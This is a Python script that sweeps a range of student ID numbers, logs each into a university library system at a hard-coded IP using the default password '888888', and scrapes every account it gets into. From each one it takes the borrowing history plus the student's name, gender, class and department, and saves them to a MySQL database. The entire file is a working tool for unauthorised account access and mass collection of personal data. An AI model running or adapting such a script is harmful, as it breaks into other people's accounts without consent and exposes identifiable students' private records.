# !/usr/bin/env python3

# Author: @ChenAnzong
# Function: 利用默认密码模拟登陆指定学号范围的学生到学校图书馆系统，并抓取大学期间所有图书馆借书记录并保存到mysql数据库
# Date: 2017-10-24

import requests
import re
import chardet
import urllib
from bs4 import BeautifulSoup
import pandas as pd
from sqlalchemy import create_engine
import pymysql

pymysql.install_as_MySQLdb()
ENGINE = None
# 以下填入配置信息 ---------------------
DATABASE_TABLE_NAME = 'result'
# =====================================
# 在此填入开始学号与结束学号 !!!
ID_START = 41xxxxxxx
ID_END = 414xxxxxxx
# =====================================


def main():
    global ENGINE
    ENGINE = create_engine('mysql+mysqldb://root:@localhost:3306/schoollib?charset=utf8')
    students_id = range(ID_START, ID_END)
    for i in students_id:
        login_and_get(i)


def login_and_get(studentid):
    login_data = {
        'barcode': studentid,
        'password': '888888',
    }
    headers = {
        'Host': '121.33.188.47:22995',
        'Connection': 'keep-alive',
        'Origin': 'http://121.33.188.47:22995',
        'Content-type': 'application/x-www-form-urlencoded',
        'Referer': 'http://121.33.188.47:22995/opac_two/reader/infoList.jsp',
    }
    session = requests.session()
    login_url = 'http://121.33.188.47:22995/opac_two/include/login_app.jsp'

    content = session.post(login_url, headers=headers, data=login_data)
    if re.search(r'查无此读者', content.text):
        print("%s 账号或密码不匹配,正在尝试下一个" % studentid)
        return
    else:
        print("%s 登入成功" % studentid, end='')

    # 查询所有图书馆4年内借阅的图书的参数
    borrow_param = {
        'library_id': '%C3%8B%C3%B9%C3%93%C3%90%C2%B7%C3%96%C2%B9%C3%9D',
        'fromdate': '2014-8-1',
        'todate': '2017-11-30',
        'b1': '%BC%EC%CB%F7',
    }

    borrow_history_url = 'http://121.33.188.47:22995/opac_two/reader/jieshulishi.jsp?' + \
                         urllib.parse.urlencode(borrow_param)
    srudents_msg_url = 'http://121.33.188.47:22995/opac_two/reader/reader_set.jsp'
    borrow_history_content = session.get(borrow_history_url, headers=headers, data=borrow_param)
    students_msg_content = session.get(srudents_msg_url, headers=headers)
    # 此网页内容非utf8编码，为防止乱码检测返回网页内容的编码，实际检测到的编码为gb2312
    encode_msg = chardet.detect(borrow_history_content.content)
    # print(encode_msg) # out: gb2312
    borrow_history_text = str(borrow_history_content.content, encode_msg.get('encoding'))
    students_msg_text = str(students_msg_content.content, encode_msg.get('encoding'))
    b_soup = BeautifulSoup(borrow_history_text, 'lxml', from_encoding=encode_msg['encoding'])

    is_borrow1 = b_soup.select("tr.td_color_1 > td:nth-of-type(4)")
    is_borrow2 = b_soup.select("tr.td_color_2 > td:nth-of-type(4)")
    is_borrow3 = is_borrow1 + is_borrow2

    # 统计借书数
    books_count = 0
    for i in range(len(is_borrow3)):
        if get_tag_text(is_borrow3[i]) == '借书':
            books_count += 1
    if books_count == 0:
        print(' !此同学竟然没有向图书馆借过书')
        return

    # 分别匹配班级，系别，姓名，性别信息
    student_class = re.findall(r'name="str_reader_addr" type="text"  value="(.*?)"', students_msg_text)[0]
    student_department = \
    re.findall(re.compile("读者单位:</TD>[\t\r\n\s]{12}<TD>[\t\r\n\s]{12}(.{3,10})\r[\t\r\n\s]*?", re.M),
               students_msg_text)[0].lstrip()
    student_name = re.findall(r"名:</TD>[\t\r\n\s]{12}<TD>[\t\r\n\s]{12}(.{3})[\t\r\n\s]*?", students_msg_text)[0]
    student_gender = re.findall(r"性别:</TD>[\t\r\n\s]{12}<TD>[\t\r\n\s]{12}(.)[\t\r\n\s]*?", students_msg_text)[0]

    # [列表]书名
    books = []
    book1 = b_soup.select("tr.td_color_1 > td:nth-of-type(2)")
    book2 = b_soup.select("tr.td_color_2 > td:nth-of-type(2)")
    book3 = book1 + book2

    # [列表]借书时间
    date = []
    date1 = b_soup.select("tr.td_color_1 > td:nth-of-type(5)")
    date2 = b_soup.select("tr.td_color_2 > td:nth-of-type(5)")
    date3 = date1 + date2

    print(' 并成功读取借书历史 借阅数为:' + str(books_count))
    for k in range(books_count):
        books.append(get_tag_text(book3[k]))
        date.append(get_tag_text(date3[k]))

    # 对数据进行持久化操作
    df = pd.DataFrame({
        '系别': student_department,
        '学号': studentid,
        '姓名': student_name,
        '性别': student_gender,
        '班级': student_class,
        '借书时间': pd.Categorical(date),
        '书名': pd.Categorical(books),
    })
    df.to_sql(DATABASE_TABLE_NAME, ENGINE, if_exists='append')


def get_tag_text(tag):
    """
    :param tag: HTML标签
    :return: 标签里面的文字
    """

    r = re.compile('>(.*?)\s<')
    return re.findall(r, str(tag))[0]

if __name__ == '__main__':
    main()
